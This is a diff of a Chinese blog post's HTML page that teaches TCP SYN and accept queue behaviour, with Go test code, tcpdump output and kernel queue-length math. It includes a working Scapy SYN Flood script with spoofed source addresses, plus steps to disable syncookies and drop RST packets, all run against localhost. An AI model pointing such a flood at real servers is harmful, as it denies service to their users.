@@ -23,7 +23,14 @@
   <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/zoom-vanilla.js@2.0.6/css/zoom.css">
 
   <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
-  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3.0.0/es5/tex-mml-chtml.js"></script>
+  <script>
+  MathJax = {
+    tex: {
+      inlineMath: [["$", "$"]],
+    },
+  }
+  </script>
+  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3.0.0/es5/tex-chtml.js"></script>
   <script type="text/javascript">
     window.PAGE = {
       title: "从一次 Connection Reset 说起，TCP 半连接队列与全连接队列",
@@ -65,173 +72,248 @@
 
       <div class="post__content">
         <p>之前用 Go 编写过一个简单的服务器和客户端，用来测试 Go 的 HTTP 性能，无意中发现了一个奇怪的问题。</p>
-<p>在我的 Mac 上客户端程序会非常稳定地遇到 <em>Connection Reset</em> 的错误，让人一头雾水。</p>
-<h2 id="奇怪的-connection-reset">奇怪的 Connection Reset</h2>
-<p>Server 代码如下：</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-go" data-lang="go"><span style="color:#000;font-weight:bold">package</span> main
 
-<span style="color:#000;font-weight:bold">import</span> (
-  <span style="color:#d14">&#34;log&#34;</span>
-  <span style="color:#d14">&#34;net/http&#34;</span>
+<p>在我的 Mac 上客户端程序会非常稳定地遇到 <em>Connection Reset</em> 的错误，让人一头雾水。</p>
+
+<h2 id="奇怪的-connection-reset">奇怪的 Connection Reset</h2>
+
+<p>Server 代码如下：</p>
+
+<pre><code class="language-go">package main
+
+import (
+  &quot;log&quot;
+  &quot;net/http&quot;
 )
 
-<span style="color:#000;font-weight:bold">var</span> content = []<span style="color:#0086b3">byte</span>(<span style="color:#d14">`</span><span style="color:#d14">hello world</span><span style="color:#d14">`</span>)
+var content = []byte(`hello world`)
 
-<span style="color:#000;font-weight:bold">func</span> <span style="color:#900;font-weight:bold">main</span>() {
-  http.<span style="color:#900;font-weight:bold">HandleFunc</span>(<span style="color:#d14">&#34;/&#34;</span>, <span style="color:#000;font-weight:bold">func</span>(w http.ResponseWriter, r <span style="color:#000;font-weight:bold">*</span>http.Request) {
-    w.<span style="color:#900;font-weight:bold">Write</span>(content)
+func main() {
+  http.HandleFunc(&quot;/&quot;, func(w http.ResponseWriter, r *http.Request) {
+    w.Write(content)
   })
 
-  log.<span style="color:#900;font-weight:bold">Fatal</span>(http.<span style="color:#900;font-weight:bold">ListenAndServe</span>(<span style="color:#d14">&#34;:7777&#34;</span>, <span style="color:#000;font-weight:bold">nil</span>))
+  log.Fatal(http.ListenAndServe(&quot;:7777&quot;, nil))
 }
-</code></pre></div><p>Client 代码如下：</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-go" data-lang="go"><span style="color:#000;font-weight:bold">package</span> main
+</code></pre>
 
-<span style="color:#000;font-weight:bold">import</span> (
-  <span style="color:#d14">&#34;fmt&#34;</span>
-  <span style="color:#d14">&#34;io&#34;</span>
-  <span style="color:#d14">&#34;io/ioutil&#34;</span>
-  <span style="color:#d14">&#34;net/http&#34;</span>
-  <span style="color:#d14">&#34;os&#34;</span>
-  <span style="color:#d14">&#34;strconv&#34;</span>
-  <span style="color:#d14">&#34;sync&#34;</span>
-  <span style="color:#d14">&#34;time&#34;</span>
+<p>Client 代码如下：</p>
+
+<pre><code class="language-go">package main
+
+import (
+  &quot;fmt&quot;
+  &quot;io&quot;
+  &quot;io/ioutil&quot;
+  &quot;net/http&quot;
+  &quot;os&quot;
+  &quot;strconv&quot;
+  &quot;sync&quot;
+  &quot;time&quot;
 )
 
-<span style="color:#000;font-weight:bold">var</span> httpClient <span style="color:#000;font-weight:bold">*</span>http.Client
+var httpClient *http.Client
 
-<span style="color:#000;font-weight:bold">func</span> <span style="color:#900;font-weight:bold">main</span>() {
-  n <span style="color:#000;font-weight:bold">:=</span> <span style="color:#099">1000</span>
-  <span style="color:#000;font-weight:bold">if</span> <span style="color:#0086b3">len</span>(os.Args) &gt; <span style="color:#099">1</span> {
-    <span style="color:#000;font-weight:bold">if</span> x, err <span style="color:#000;font-weight:bold">:=</span> strconv.<span style="color:#900;font-weight:bold">Atoi</span>(os.Args[<span style="color:#099">1</span>]); err <span style="color:#000;font-weight:bold">==</span> <span style="color:#000;font-weight:bold">nil</span> {
+func main() {
+  n := 1000
+  if len(os.Args) &gt; 1 {
+    if x, err := strconv.Atoi(os.Args[1]); err == nil {
       n = x
     }
   }
 
-  httpClient = <span style="color:#000;font-weight:bold">&amp;</span>http.Client{
-    Transport: <span style="color:#000;font-weight:bold">&amp;</span>http.Transport{
-      MaxIdleConnsPerHost: <span style="color:#099">2</span> <span style="color:#000;font-weight:bold">*</span> n,
-      MaxIdleConns:        <span style="color:#099">2</span> <span style="color:#000;font-weight:bold">*</span> n,
+  httpClient = &amp;http.Client{
+    Transport: &amp;http.Transport{
+      MaxIdleConnsPerHost: 2 * n,
+      MaxIdleConns:        2 * n,
     },
-    Timeout: <span style="color:#099">30</span> <span style="color:#000;font-weight:bold">*</span> time.Second,
+    Timeout: 30 * time.Second,
   }
 
-  <span style="color:#000;font-weight:bold">var</span> wg sync.WaitGroup
+  var wg sync.WaitGroup
 
-  <span style="color:#000;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">:=</span> <span style="color:#099">0</span>; i &lt; n; i<span style="color:#000;font-weight:bold">++</span> {
-    wg.<span style="color:#900;font-weight:bold">Add</span>(<span style="color:#099">1</span>)
-    <span style="color:#000;font-weight:bold">go</span> <span style="color:#000;font-weight:bold">func</span>() {
-      <span style="color:#900;font-weight:bold">do</span>()
-      wg.<span style="color:#900;font-weight:bold">Done</span>()
+  for i := 0; i &lt; n; i++ {
+    wg.Add(1)
+    go func() {
+      do()
+      wg.Done()
     }()
   }
 
-  wg.<span style="color:#900;font-weight:bold">Wait</span>()
+  wg.Wait()
 }
 
-<span style="color:#000;font-weight:bold">func</span> <span style="color:#900;font-weight:bold">do</span>() {
-  <span style="color:#000;font-weight:bold">const</span> url = <span style="color:#d14">&#34;http://127.0.0.1:7777&#34;</span>
-  resp, err <span style="color:#000;font-weight:bold">:=</span> httpClient.<span style="color:#900;font-weight:bold">Get</span>(url)
-  <span style="color:#000;font-weight:bold">if</span> err <span style="color:#000;font-weight:bold">!=</span> <span style="color:#000;font-weight:bold">nil</span> {
-    fmt.<span style="color:#900;font-weight:bold">Printf</span>(<span style="color:#d14">&#34;error: %v\n&#34;</span>, err)
-    <span style="color:#000;font-weight:bold">return</span>
+func do() {
+  const url = &quot;http://127.0.0.1:7777&quot;
+  resp, err := httpClient.Get(url)
+  if err != nil {
+    fmt.Printf(&quot;error: %v\n&quot;, err)
+    return
   }
-  io.<span style="color:#900;font-weight:bold">Copy</span>(ioutil.Discard, resp.Body)
-  resp.Body.<span style="color:#900;font-weight:bold">Close</span>()
+  io.Copy(ioutil.Discard, resp.Body)
+  resp.Body.Close()
 }
-</code></pre></div><p>都是非常基础的代码，启动多个 Goroutine 并发请求一个只会返回 &ldquo;Hello World&rdquo; 的 Server 而已。</p>
+</code></pre>
+
+<p>都是非常基础的代码，启动多个 Goroutine 并发请求一个只会返回 &ldquo;Hello World&rdquo; 的 Server 而已。</p>
+
 <p>在我的 Mac 上运行的时候，会遇到如下错误：</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-text" data-lang="text">error: Get http://127.0.0.1:7777: read tcp 127.0.0.1:53868-&gt;127.0.0.1:7777: read: connection reset by peer
-</code></pre></div><p>非常奇怪的 <em>connection reset by peer</em> ，看起来应该是 Server 发送了一个 TCP 的 RST 包。</p>
+
+<pre><code class="language-text">error: Get http://127.0.0.1:7777: read tcp 127.0.0.1:53868-&gt;127.0.0.1:7777: read: connection reset by peer
+</code></pre>
+
+<p>非常奇怪的 <em>connection reset by peer</em> ，看起来应该是 Server 发送了一个 TCP 的 RST 包。</p>
+
 <p>验证一下：</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash">sudo tcpdump -nn -i lo0 src port <span style="color:#099">7777</span> | tee output.txt
-</code></pre></div><p>里面有如下记录，说明我们的分析是对的。</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-text" data-lang="text">20:04:15.985768 IP 127.0.0.1.7777 &gt; 127.0.0.1.49278: Flags [R], seq 2946808821, win 0, length 0
-</code></pre></div><p>问题是，为什么？</p>
-<h2 id="半连接队列syn-queue和全连接队列accept-queue">半连接队列（SYN Queue）和全连接队列（Accept Queue）</h2>
+
+<pre><code class="language-bash">sudo tcpdump -nn -i lo0 src port 7777 | tee output.txt
+</code></pre>
+
+<p>里面有如下记录，说明我们的分析是对的。</p>
+
+<pre><code class="language-text">20:04:15.985768 IP 127.0.0.1.7777 &gt; 127.0.0.1.49278: Flags [R], seq 2946808821, win 0, length 0
+</code></pre>
+
+<p>问题是，为什么？</p>
+
+<h2 id="半连接队列-syn-queue-和全连接队列-accept-queue">半连接队列（SYN Queue）和全连接队列（Accept Queue）</h2>
+
 <p>我们把同样的代码放在 Linux 上运行一下试试，这一次，很正常，没有报错，说明这是一个系统级别的问题。</p>
+
 <p>有一个很重要的点就是：<strong>Mac 是基于 BSD 的，和 Linux 在很多地方是有不同的</strong>。所以，在 Mac 上测试，没问题自然好，有问题第一反应应该是去 Linux 上测试，毕竟 Linux 才是生产机器。</p>
+
 <p>先透露一下结论，上面这个问题根本原因在于：<strong>全连接队列满了</strong>。</p>
+
 <p>我们首先来复习一下 TCP 三次握手，下面是 TCP 的状态变化图。</p>
-<p><img src="http://asset.cjting.cn/FuLfMxUTfLJeZgkFQuJvez1oeAAI.png" alt=""></p>
+
+<p><img src="http://asset.cjting.cn/FuLfMxUTfLJeZgkFQuJvez1oeAAI.png" alt="" /></p>
+
 <p>TCP 通信不管上层怎么封装，最下面用的始终是 Socket 的一套接口。</p>
+
 <p>基本过程是，Server 调用 <code>listen</code> 监听端口，客户端使用 <code>connect</code> 发起连接，然后 Server 使用 <code>accept</code> 获取已经到达 <code>ESTABLISHED</code> 状态的连接，然后进行读写。</p>
+
 <p>从数据包来看：</p>
+
 <ol>
 <li>Client: 发送 SYN，连接状态进入 <code>SYN_SENT</code></li>
 <li>Server: 收到 SYN, 创建连接状态为 <code>SYN_RCVD/SYN_RECV</code> 的 Socket，响应 SYN/ACK</li>
 <li>Client: 收到 SYN/ACK，连接状态从 <code>SYN_SENT</code> 变为 <code>ESTABLISHED</code>，响应 ACK</li>
 <li>Server: 收到 ACK，连接状态变为 <code>ESTABLISHED</code></li>
 </ol>
+
 <p>此时，双方的 Socket 都已经进入了 <code>ESTABLISHED</code> 状态，接下来就可以开始交换数据了。</p>
+
 <p>从上面的过程中我们可以看出，Server 需要两个队列，分别存储 <code>SYN_RCVD</code> 状态的连接和 <code>ESTABLISHED</code> 状态的连接，这就是半连接队列和全连接队列。</p>
-<h2 id="somaxconn--tcp_max_syn_backlog">somaxconn &amp; tcp_max_syn_backlog</h2>
+
+<h2 id="somaxconn-tcp-max-syn-backlog">somaxconn &amp; tcp_max_syn_backlog</h2>
+
 <p>既然是队列，就肯定有一个长度限制，就肯定存在溢出的问题。</p>
+
 <p>我们首先来看长度限制，之后所有的讨论系统环境都是 CentOS 7。</p>
+
 <p>全连接队列的大小比较简单，为 <code>min(backlog, somaxconn)</code>。其中 <code>backlog</code> 为调用 <code>listen</code> 函数时传递的参数，而 <code>somaxconn</code> 是一个系统参数，位置为 <code>/proc/sys/net/core/somaxconn</code>，默认值为 128。</p>
+
 <p>半连接队列就是一个比较复杂的事情了，Google 了很久，大多含糊其辞，说不清楚，最后发现这篇 <a href="https://www.cnblogs.com/zengkefu/p/5606696.html">Linux 诡异的半连接队列长度</a> 博客，写的很好。</p>
+
 <p>当然，最好的方法永远是去读源码，但是网络栈太复杂，看相关的分析文章再结合源码效率会高很多，直接去读容易怀疑人生。</p>
+
 <p>总体来说，半连接队列的长度由以下过程确定：</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-c" data-lang="c">backlog <span style="color:#000;font-weight:bold">=</span> min(somaxconn, backlog)
-nr_table_entries <span style="color:#000;font-weight:bold">=</span> backlog
-nr_table_entries <span style="color:#000;font-weight:bold">=</span> min(backlog, sysctl_max_syn_backlog)
-nr_table_entries <span style="color:#000;font-weight:bold">=</span> max(nr_table_entries, <span style="color:#099">8</span>)
-<span style="color:#998;font-style:italic">// roundup_pow_of_two: 将参数向上取整到最小的 2^n
-</span><span style="color:#998;font-style:italic"></span><span style="color:#998;font-style:italic">// 注意这里存在一个 +1
-</span><span style="color:#998;font-style:italic"></span>nr_table_entries <span style="color:#000;font-weight:bold">=</span> roundup_pow_of_two(nr_table_entries <span style="color:#000;font-weight:bold">+</span> <span style="color:#099">1</span>)
-max_qlen_log <span style="color:#000;font-weight:bold">=</span> max(<span style="color:#099">3</span>, log2(nr_table_entries))
-max_queue_length <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">2</span><span style="color:#000;font-weight:bold">^</span>max_qlen_log
-</code></pre></div><p>有一点绕，不过运算都很简单，半连接队列的长度实际上由三个参数决定：</p>
+
+<pre><code class="language-c">backlog = min(somaxconn, backlog)
+nr_table_entries = backlog
+nr_table_entries = min(backlog, sysctl_max_syn_backlog)
+nr_table_entries = max(nr_table_entries, 8)
+// roundup_pow_of_two: 将参数向上取整到最小的 2^n
+// 注意这里存在一个 +1
+nr_table_entries = roundup_pow_of_two(nr_table_entries + 1)
+max_qlen_log = max(3, log2(nr_table_entries))
+max_queue_length = 2^max_qlen_log
+</code></pre>
+
+<p>有一点绕，不过运算都很简单，半连接队列的长度实际上由三个参数决定：</p>
+
 <ul>
 <li><code>listen</code> 时传入的 backlog</li>
 <li><code>/proc/sys/net/ipv4/tcp_max_syn_backlog</code>，默认为 1024</li>
 <li><code>/proc/sys/net/core/somaxconn</code>，默认为 128</li>
 </ul>
+
 <p>我们假设 <code>listen</code> 传入的 backlog = 511，其他配置都是默认值，我们来计算一下半连接队列的具体长度。</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-text" data-lang="text">backlog = min(128, 511) = 128
+
+<pre><code class="language-text">backlog = min(128, 511) = 128
 nr_table_entries = 128
 nr_table_entries = min(128, 1024) = 128
 nr_table_entries = max(128, 8) = 128
 nr_table_entries = roundup_pow_of_two(129) = 256
 max_qlen_log = max(3, 8) = 8
 max_queue_length = 2^8 = 256
-</code></pre></div><p>最后算出，半连接队列的长度为 256。</p>
+</code></pre>
+
+<p>最后算出，半连接队列的长度为 256。</p>
+
 <p>如果理解了半连接队列的长度决定机制，我们就可以理解为什么 <a href="https://github.com/nginx/nginx/blob/release-1.17.3/src/os/unix/ngx_linux_config.h#L107">Nginx</a>, <a href="https://github.com/antirez/redis/blob/5.0.5/src/server.h#L87">Redis</a> 都把自己的 listen backlog 参数设置为 <code>511</code> 了，因为内核计算过程中有一个奇怪的 +1 操作。</p>
+
 <p>现在队列的长度已经确定了，那么队列如果满了的话会怎么样呢？</p>
+
 <p>先来看半连接队列，这里就涉及到一个著名的攻击，SYN Flood 攻击。</p>
-<h2 id="半连接队列溢出--syn-flood">半连接队列溢出 &amp; SYN Flood</h2>
+
+<h2 id="半连接队列溢出-syn-flood">半连接队列溢出 &amp; SYN Flood</h2>
+
 <p>SYN Flood 的思路很简单，发送大量的 SYN 数据包给 Server，然后不回应 Server 响应的 SYN/ACK，这样，Server 端就会存在大量处于 <code>SYN_RECV</code> 状态的连接，这样的连接会持续填充半连接队列，最终导致半连接队列溢出。</p>
+
 <p>当半连接队列溢出时，Server 收到了新的发起连接的 SYN：</p>
+
 <ul>
 <li>如果不开启 <code>net.ipv4.tcp_syncookies</code>：直接丢弃这个 SYN</li>
 <li>如果开启 <code>net.ipv4.tcp_syncookies</code>：
+
 <ul>
 <li>如果全连接队列满了，并且 <code>qlen_young</code> 的值大于 1：丢弃这个 SYN</li>
 <li>否则，生成 syncookie 并返回 SYN/ACK 包</li>
+</ul></li>
 </ul>
-</li>
-</ul>
+
 <p><code>qlen_young</code> 表示目前半连接队列中，没有进行 SYN/ACK 包重传的连接数量。</p>
+
 <p>这里涉及到一个 <code>net.ipv4.tcp_syncookies</code> 配置项，这是内核用于抵御 SYN Flood 攻击的一种方式，它的核心思想在于：攻击者对于我们返回的 SYN/ACK 包是不会回复的，而正常用户会回复一个 ACK 包。</p>
+
 <p>通过生成一个 Cookie 携带在我们返回的 SYN/ACK 包中，之后我们收到了 ACK 包，我们可以验证 Cookie 是否正确，如果正确，则允许建立连接。详细的过程比较复杂，这里不再讨论了。</p>
+
 <p>当 <code>net.ipv4.syncookies</code> 开启的时候，即便半连接队列已经满了，正常用户依旧可以和服务器进行通信。</p>
+
 <p>当然，抵御 SYN Flood 攻击还有一些别的参数可以调整，不再一一说明了，网络栈十分复杂，感兴趣的朋友可以自己深入了解。</p>
+
 <p>如果我们关闭 <code>net.ipv4.tcp_syncookies</code> 的话，当收到 SYN Flood 攻击时，系统会直接丢弃新的 SYN 包，也就是正常客户端将无法和服务器通信。</p>
+
 <p>现在我们来动手实现一下 SYN Flood 攻击，首先安装 <a href="https://scapy.net/">Scapy</a> <code>pip install scapy</code>。</p>
+
 <p>关闭 <code>net.ipv4.tcp_syncookies</code> 选项 <code>sysctl net.ipv4.tcp_syncookies=0</code>。</p>
+
 <p>启动一个 <a href="https://gist.github.com/cj1128/e6620df2ea2e650164d7513b05c88c8c">simple-tcp-server</a> 来监听 8877 端口，<code>listen</code> 的 <code>backlog</code> 参数为 7, <code>somaxconn</code> 为默认值 128，<code>tcp_max_syn_backlog</code> 为默认值 1024，此时半连接队列的长度为 16。</p>
+
 <p>启动 <code>tcpdump</code> 监听 8877 端口相关的所有数据包 <code>tcpdump -tn -i lo port 8877</code>。</p>
+
 <p>启动 <code>scapy</code> 命令行工具，我们先来发送一个 SYN 包看看。</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-python" data-lang="python">ip <span style="color:#000;font-weight:bold">=</span> IP(dst<span style="color:#000;font-weight:bold">=</span><span style="color:#d14"></span><span style="color:#d14">&#34;</span><span style="color:#d14">127.0.0.1</span><span style="color:#d14">&#34;</span>)
-tcp <span style="color:#000;font-weight:bold">=</span> TCP(dport<span style="color:#000;font-weight:bold">=</span><span style="color:#099">8877</span>, flags<span style="color:#000;font-weight:bold">=</span><span style="color:#d14"></span><span style="color:#d14">&#34;</span><span style="color:#d14">S</span><span style="color:#d14">&#34;</span>)
-send(ip<span style="color:#000;font-weight:bold">/</span>tcp)
-</code></pre></div><p>我们会发现，tcpdump 显示收到一个 SYN 包，但是没有对应的 SYN/ACK 回复？？？</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-text" data-lang="text">IP 127.0.0.1.ftp-data &gt; 127.0.0.1.8877: Flags [S], seq 0, win 8192, length 0
-</code></pre></div><p>我们用 nc 试一下 <code>nc -4 localhost 8877</code>，三次握手，一切正常。</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-text" data-lang="text">IP 127.0.0.1.57950 &gt; 127.0.0.1.8877: Flags [S], seq 1788626632, win 43690, options [mss 65495,sackOK,TS val 162260912 ecr 0,nop,wscale 7], length 0
+
+<pre><code class="language-python">ip = IP(dst=&quot;127.0.0.1&quot;)
+tcp = TCP(dport=8877, flags=&quot;S&quot;)
+send(ip/tcp)
+</code></pre>
+
+<p>我们会发现，tcpdump 显示收到一个 SYN 包，但是没有对应的 SYN/ACK 回复？？？</p>
+
+<pre><code class="language-text">IP 127.0.0.1.ftp-data &gt; 127.0.0.1.8877: Flags [S], seq 0, win 8192, length 0
+</code></pre>
+
+<p>我们用 nc 试一下 <code>nc -4 localhost 8877</code>，三次握手，一切正常。</p>
+
+<pre><code class="language-text">IP 127.0.0.1.57950 &gt; 127.0.0.1.8877: Flags [S], seq 1788626632, win 43690, options [mss 65495,sackOK,TS val 162260912 ecr 0,nop,wscale 7], length 0
 IP 127.0.0.1.8877 &gt; 127.0.0.1.57950: Flags [S.], seq 2522189106, ack 1788626633, win 43690, options [mss 65495,sackOK,TS val 162260912 ecr 162260912,nop,wscale 7], length 0
 IP 127.0.0.1.57950 &gt; 127.0.0.1.8877: Flags [.], ack 1, win 342, options [nop,nop,TS val 162260912 ecr 162260912], length 0
-</code></pre></div><p>Flags <code>[S.]</code> 中的 <code>.</code> 表示 ACK，很奇怪为什么不用 A，我猜应该又是一个“历史原因”，顺带附一下 Flags 的完整列表。</p>
+</code></pre>
+
+<p>Flags <code>[S.]</code> 中的 <code>.</code> 表示 ACK，很奇怪为什么不用 A，我猜应该又是一个“历史原因”，顺带附一下 Flags 的完整列表。</p>
+
 <ul>
 <li><code>S</code>: SYN</li>
 <li><code>F</code>: FIN</li>
@@ -242,105 +324,177 @@ IP 127.0.0.1.57950 &gt; 127.0.0.1.8877: Flags [.], ack 1, win 342, options [nop,
 <li><code>E</code>: ECN Echo</li>
 <li><code>.</code>: ACK</li>
 </ul>
+
 <p>究竟发生了什么，为什么使用 Scapy 发送的 SYN 包没有 SYN/ACK 回复？？？</p>
+
 <p>这个问题困扰了我很久，一直没有找到答案，各种 Google 都没有相关信息，毫无头绪，深深地感受到了自己的无知😭。</p>
+
 <p>后来仔细一想，既然 nc 可以，Scapy 不行，说明是 Scapy 的设置问题，把 Scapy 的文档从头到尾一字不落地看一遍，应该会有收获。</p>
+
 <p>果然，在 FAQ 中，提到了这个 <a href="https://scapy.readthedocs.io/en/latest/troubleshooting.html#faq">问题</a>。找到答案的那一刻，我差点热泪盈眶。</p>
+
 <p>修改很简单，我们将 L3socket 从 PacketScoket 改为 RawSocket 就行了。再发送 SYN 包看看，这一次，内核回复了 SYN/ACK，但是，又来了一个问题，内核紧跟着又回复了一个 RST。</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-python" data-lang="python">conf<span style="color:#000;font-weight:bold">.</span>L3socket<span style="color:#000;font-weight:bold">=</span>L3RawSocket
-send(ip<span style="color:#000;font-weight:bold">/</span>tcp)
-</code></pre></div><div class="highlight"><pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-text" data-lang="text">IP 127.0.0.1.ftp-data &gt; 127.0.0.1.8877: Flags [S], seq 0, win 8192, length 0
+
+<pre><code class="language-python">conf.L3socket=L3RawSocket
+send(ip/tcp)
+</code></pre>
+
+<pre><code class="language-text">IP 127.0.0.1.ftp-data &gt; 127.0.0.1.8877: Flags [S], seq 0, win 8192, length 0
 IP 127.0.0.1.8877 &gt; 127.0.0.1.ftp-data: Flags [S.], seq 2150811556, ack 1, win 43690, options [mss 65495], length 0
 IP 127.0.0.1.ftp-data &gt; 127.0.0.1.8877: Flags [R], seq 1, win 0, length 0
-</code></pre></div><p>前进的道路总是崎岖的，这次又是为什么？？？</p>
+</code></pre>
+
+<p>前进的道路总是崎岖的，这次又是为什么？？？</p>
+
 <p>这次问题比较好回答了，Scapy 运行在用户空间，SYN/ACK 这个包内核会先收到。因为我们用的是 RawSocket，内核不知道我们在进行三次握手，内核突然收到了一个 SYN/ACK 包，同时这个包对应的端口没有相关的 Socket，那么内核会认为这是一个无效的数据包，返回 RST 断开连接。正常情况下，三次握手都是由内核完成，内核知道我们在握手，此时内核并不知道。</p>
+
 <p>因为我们要测试 SYN Flood，这个 RST 包会使得 Server 断开连接，将连接从半连接队列中清除，使得我们的攻击无效。</p>
+
 <p>解决这个问题的方法有两个。第一，我们不用 Loopback Network Interface，换一个，比如 en0，IP 地址是 192.168.10.2。我们构造数据包发给 en0，src IP 随便填写，比如 192.168.100.2，因为返回的 SYN/ACK 不会由我们自己的系统接收，自然也不存在内核发送 RST 的问题。</p>
+
 <p>第二，我们继续使用 Loopback，但是我们使用 iptables 将 RST 包直接丢弃，这里我们选择使用这个方法。</p>
+
 <p>CentOS 7 默认使用的是 firewalld 而不是 iptables，我们需要手动安装。</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash">$ systemctl stop firewalld
+
+<pre><code class="language-bash">$ systemctl stop firewalld
 $ yum install -y iptables-services
 $ systemctl start iptables
-<span style="color:#998;font-style:italic"># 添加规则，丢弃所有的 RST 包</span>
+# 添加规则，丢弃所有的 RST 包
 $ iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
-</code></pre></div><p>现在终于可以编写我们的攻击脚本了😈，很简单，循环发送 SYN 包即可。</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-python" data-lang="python"><span style="color:#000;font-weight:bold">from</span> <span style="color:#555">time</span> <span style="color:#000;font-weight:bold">import</span> sleep
-<span style="color:#000;font-weight:bold">from</span> <span style="color:#555">random</span> <span style="color:#000;font-weight:bold">import</span> randint
-ip <span style="color:#000;font-weight:bold">=</span> IP(dst<span style="color:#000;font-weight:bold">=</span><span style="color:#d14"></span><span style="color:#d14">&#34;</span><span style="color:#d14">127.0.0.1</span><span style="color:#d14">&#34;</span>)
-tcp <span style="color:#000;font-weight:bold">=</span> TCP(dport<span style="color:#000;font-weight:bold">=</span><span style="color:#099">8877</span>, flags<span style="color:#000;font-weight:bold">=</span><span style="color:#d14"></span><span style="color:#d14">&#34;</span><span style="color:#d14">S</span><span style="color:#d14">&#34;</span>)
-<span style="color:#000;font-weight:bold">def</span> <span style="color:#900;font-weight:bold">attack</span>():
-  <span style="color:#000;font-weight:bold">while</span> <span style="color:#999">True</span>:
-    ip<span style="color:#000;font-weight:bold">.</span>src<span style="color:#000;font-weight:bold">=</span>f<span style="color:#d14"></span><span style="color:#d14">&#34;</span><span style="color:#d14">127.0.0.{randint(0, 255)}</span><span style="color:#d14">&#34;</span>
-    send(ip<span style="color:#000;font-weight:bold">/</span>tcp)
-    sleep(<span style="color:#099">0.01</span>)
+</code></pre>
 
-attack() <span style="color:#998;font-style:italic"># 发送大量的 SYN 包给目标地址</span>
-</code></pre></div><p>启动 <code>attack</code> 以后，此时我们试着用 <code>telnet localhost 8877</code> 去连接 8877 端口，会发现无法连接，说明攻击奏效了，因为半连接队列满了，Server 直接丢弃了 SYN 包，新的客户端无法和 Server 建立通讯。</p>
+<p>现在终于可以编写我们的攻击脚本了😈，很简单，循环发送 SYN 包即可。</p>
+
+<pre><code class="language-python">from time import sleep
+from random import randint
+ip = IP(dst=&quot;127.0.0.1&quot;)
+tcp = TCP(dport=8877, flags=&quot;S&quot;)
+def attack():
+  while True:
+    ip.src=f&quot;127.0.0.{randint(0, 255)}&quot;
+    send(ip/tcp)
+    sleep(0.01)
+
+attack() # 发送大量的 SYN 包给目标地址
+</code></pre>
+
+<p>启动 <code>attack</code> 以后，此时我们试着用 <code>telnet localhost 8877</code> 去连接 8877 端口，会发现无法连接，说明攻击奏效了，因为半连接队列满了，Server 直接丢弃了 SYN 包，新的客户端无法和 Server 建立通讯。</p>
+
 <p>查看 tcpdump 的输出，我们会发现全部都是 SYN/ACK 包，因为 Server 没有收到客户端的 ACK，所以会超时重发 SYN/ACK 给客户端。</p>
-<p><img src="http://asset.cjting.cn/FnRuxggtfoszNF6p6Ax1W34L7IYM.png" alt=""></p>
+
+<p><img src="http://asset.cjting.cn/FnRuxggtfoszNF6p6Ax1W34L7IYM.png" alt="" /></p>
+
 <p>使用 <code>netstat</code> 获取 Socket 状态，会看到 16 个处于 <code>SYN_RECV</code> 的 Socket。</p>
-<p><img src="http://asset.cjting.cn/FhTwQcNe0Uuxex-M6gM2S_obva8S.png" alt=""></p>
+
+<p><img src="http://asset.cjting.cn/FhTwQcNe0Uuxex-M6gM2S_obva8S.png" alt="" /></p>
+
 <h2 id="全连接队列溢出">全连接队列溢出</h2>
+
 <p>如果全连接队满了又会怎么样？应用程序调用 <code>accept</code> 的速度太慢，或者请求太多，都会导致这个情况。</p>
+
 <p>当系统收到三次握手中第三次的 ACK 包，正常情况下应该是从半连接队列中取出连接，更改状态，放入全连接队列中。此时如果全连接队列满了的话：</p>
+
 <ul>
 <li>如果设置了 <code>net.ipv4.tcp_abort_on_overflow</code>，那么直接回复 RST，同时，对应的连接直接从半连接队列中删除</li>
 <li>否则，直接忽略 ACK，然后 TCP 的超时机制会起作用，一定时间以后，Server 会重新发送 SYN/ACK，因为在 Server 看来，它没有收到 ACK</li>
 </ul>
-<p>我们来测试一下，首先，关闭 <code>net.ipv4.tcp_abort_on_overflow</code>，启动我们的 <a href="https://gist.github.com/cj1128/e6620df2ea2e650164d7513b05c88c8c">simple-tcp-server</a>，<code>listen</code> 的 <code>backlog</code> 参数是 1，<code>somaxconn</code> 为 128，因此，全连接队列的长度为 1。</p>
-<p>使用 Scapy 定义 <code>connect</code> 函数，函数内部我们手动实现了三次握手。</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-python" data-lang="python">ip<span style="color:#000;font-weight:bold">=</span>IP(dst<span style="color:#000;font-weight:bold">=</span><span style="color:#d14"></span><span style="color:#d14">&#34;</span><span style="color:#d14">127.0.0.1</span><span style="color:#d14">&#34;</span>)
